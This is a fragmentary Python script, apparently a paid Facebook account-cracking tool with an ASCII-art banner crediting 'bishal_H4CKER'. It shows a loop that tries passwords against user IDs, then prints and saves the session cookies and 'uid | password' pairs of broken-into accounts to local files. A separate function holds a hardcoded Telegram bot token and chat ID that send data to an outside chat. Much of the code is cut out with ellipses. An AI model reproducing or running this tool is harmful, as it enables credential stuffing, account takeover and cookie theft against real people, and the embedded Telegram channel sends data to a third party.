...
def botuid():
	...
	bot_token = '6411956100:AAF2KoKWjVgWNhpEjoIDmmucVvYFTo_oaPc'
	chat_id = '6015821731'
	message = key2
...
BBBBBBBBBBBBBBBBB     iiii                  hhhhhhh                               lllllll 
B::::::::::::::::B   i::::i                 h:::::h                               l:::::l 
B::::::BBBBBB:::::B   iiii                  h:::::h                               l:::::l 
BB:::::B     B:::::B                        h:::::h                               l:::::l 
  B::::B     B:::::Biiiiiii     ssssssssss   h::::h hhhhh         aaaaaaaaaaaaa    l::::l 
  B::::B     B:::::Bi:::::i   ss::::::::::s  h::::hh:::::hhh      a::::::::::::a   l::::l 
  B::::BBBBBB:::::B  i::::i ss:::::::::::::s h::::::::::::::hh    aaaaaaaaa:::::a  l::::l 
  B:::::::::::::BB   i::::i s::::::ssss:::::sh:::::::hhh::::::h            a::::a  l::::l 
  B::::BBBBBB:::::B  i::::i  s:::::s  ssssss h::::::h   h::::::h    aaaaaaa:::::a  l::::l 
  B::::B     B:::::B i::::i    s::::::s      h:::::h     h:::::h  aa::::::::::::a  l::::l 
  B::::B     B:::::B i::::i       s::::::s   h:::::h     h:::::h a::::aaaa::::::a  l::::l 
  B::::B     B:::::B i::::i ssssss   s:::::s h:::::h     h:::::ha::::a    a:::::a  l::::l 
BB:::::BBBBBB::::::Bi::::::is:::::ssss::::::sh:::::h     h:::::ha::::a    a:::::a l::::::l
B:::::::::::::::::B i::::::is::::::::::::::s h:::::h     h:::::ha:::::aaaa::::::a l::::::l
B::::::::::::::::B  i::::::i s:::::::::::ss  h:::::h     h:::::h a::::::::::aa:::al::::::l
BBBBBBBBBBBBBBBBB   iiiiiiii  sssssssssss    hhhhhhh     hhhhhhh  aaaaaaaaaa  aaaallllllll
                                                                                                     
                                        
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
  
    ┌━━━━━━━━━━━━━━━━━ 𝒷𝒾𝓈𝒽𝒶𝓁 ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  𝒷𝒾𝓈𝒽𝒶𝓁_H4CKER            
               \033[1;91mFACEBOK      :  Bishal ISLAM               
               \033[1;97mGITHUB       :  HACKER-X_BISHAL       
               \033[1;91mSTATUS       :   Paid Tols😴            
               \033[1;97mTEAM         :  BISHAL 𝙸𝚂𝙻𝙰𝙼 -𝟷𝟿𝟶                 
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[𝒷𝒾𝓈𝒽𝒶𝓁-𝙷𝙰𝙲𝙺𝙴𝚁] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92m𝒷𝒾𝓈𝒽𝒶𝓁-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('𝒷𝒾𝓈𝒽𝒶𝓁-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('𝒷𝒾𝓈𝒽𝒶𝓁-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(𝒷𝒾𝓈𝒽𝒶𝓁-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('𝒷𝒾𝓈𝒽𝒶𝓁-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
